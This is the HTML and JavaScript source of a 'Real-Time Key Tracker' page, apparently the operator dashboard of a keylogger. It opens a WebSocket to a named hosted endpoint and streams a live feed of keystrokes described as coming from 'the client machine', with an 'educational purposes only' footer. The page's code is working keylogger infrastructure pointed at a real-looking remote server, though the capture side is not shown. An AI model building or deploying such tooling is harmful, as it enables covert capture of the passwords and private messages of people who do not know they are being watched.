<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Real-Time Key Tracker</title>
    <link
      href="https://fonts.googleapis.com/css2?family=Roboto+Mono:wght@400;700&display=swap"
      rel="stylesheet"
    />
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
      /* Custom Styles */
      body {
        font-family: "Roboto Mono", monospace;
        background-color: #1a1a1a;
        color: #e0e0e0;
      }
      .key-container {
        min-height: 200px;
        background-color: #2a2a2a;
        border: 1px solid #444;
        box-shadow: 0 4px 15px rgba(0, 0, 0, 0.5);
        word-wrap: break-word;
      }
      .key {
        display: inline-block;
        padding: 8px 12px;
        margin: 4px;
        background-color: #3a3a3a;
        border-radius: 6px;
        border-bottom: 3px solid #222;
        font-weight: bold;
        color: #a6e22e; /* Lime green for a terminal look */
        transition: all 0.1s ease-in-out;
      }
      .key.special {
        background-color: #5a5a5a;
        color: #f92672; /* Pink for special keys */
      }
      .status-dot {
        height: 12px;
        width: 12px;
        border-radius: 50%;
        display: inline-block;
        transition: background-color 0.5s ease;
      }
      .dot-red {
        background-color: #ef4444;
      }
      .dot-green {
        background-color: #22c55e;
      }
    </style>
  </head>
  <body class="flex items-center justify-center min-h-screen">
    <div class="container mx-auto p-4 md:p-8 max-w-4xl text-center">
      <header class="mb-6">
        <h1 class="text-3xl md:text-4xl font-bold text-white">
          Real-Time Key Tracker
        </h1>
        <p class="text-gray-400 mt-2">
          Live feed of keystrokes from the client machine.
        </p>
        <div class="flex items-center justify-center mt-4">
          <div id="status-dot" class="status-dot dot-red mr-2"></div>
          <span id="status-text" class="text-gray-400">Disconnected</span>
        </div>
      </header>

      <main>
        <div
          id="key-log"
          class="key-container w-full p-4 rounded-lg overflow-y-auto text-left"
        >
          <span class="text-gray-500">Waiting for input...</span>
        </div>
        <button
          id="clear-btn"
          class="mt-4 px-6 py-2 bg-red-600 hover:bg-red-700 text-white font-bold rounded-lg shadow-md transition-colors"
        >
          Clear Log
        </button>
      </main>

      <footer class="mt-8 text-gray-500 text-sm">
        <p>&copy; 2024 Key Tracker Inc. For educational purposes only.</p>
      </footer>
    </div>

    <script>
      const WEBSOCKET_URL = "wss://keylogger12-nze77.hf.space/ws/ui";
      const keyLog = document.getElementById("key-log");
      const statusDot = document.getElementById("status-dot");
      const statusText = document.getElementById("status-text");
      const clearBtn = document.getElementById("clear-btn");
      let waitingForInput = true;

      function connectWebSocket() {
        const socket = new WebSocket(WEBSOCKET_URL);

        socket.onopen = function (event) {
          console.log("WebSocket connection established.");
          statusDot.classList.remove("dot-red");
          statusDot.classList.add("dot-green");
          statusText.textContent = "Connected";
        };

        socket.onmessage = function (event) {
          if (waitingForInput) {
            keyLog.innerHTML = "";
            waitingForInput = false;
          }

          const key = event.data;
          const isSpecialKey = key.startsWith("[") && key.endsWith("]");
          let lastElement = keyLog.lastElementChild;

          // --- LATENCY FIX: Efficient DOM manipulation ---
          // If the new key is a normal character and the last element is not a special key,
          // just append the text. This is much faster than creating a new element.
          if (
            !isSpecialKey &&
            lastElement &&
            !lastElement.classList.contains("special")
          ) {
            lastElement.textContent += key;
          } else {
            // Otherwise, create a new element for the key.
            const keyElement = document.createElement("span");
            keyElement.className = "key";
            if (isSpecialKey) {
              keyElement.classList.add("special");
            }
            keyElement.textContent = key;
            keyLog.appendChild(keyElement);
          }
          // --------------------------------------------------

          keyLog.scrollTop = keyLog.scrollHeight;
        };

        socket.onclose = function (event) {
          console.log("WebSocket connection closed. Reconnecting...");
          statusDot.classList.remove("dot-green");
          statusDot.classList.add("dot-red");
          statusText.textContent = "Disconnected. Retrying...";
          setTimeout(connectWebSocket, 3000);
        };

        socket.onerror = function (error) {
          console.error("WebSocket error:", error);
          socket.close();
        };
      }

      clearBtn.addEventListener("click", () => {
        keyLog.innerHTML =
          '<span class="text-gray-500">Waiting for input...</span>';
        waitingForInput = true;
      });

      connectWebSocket();
    </script>
  </body>
</html>
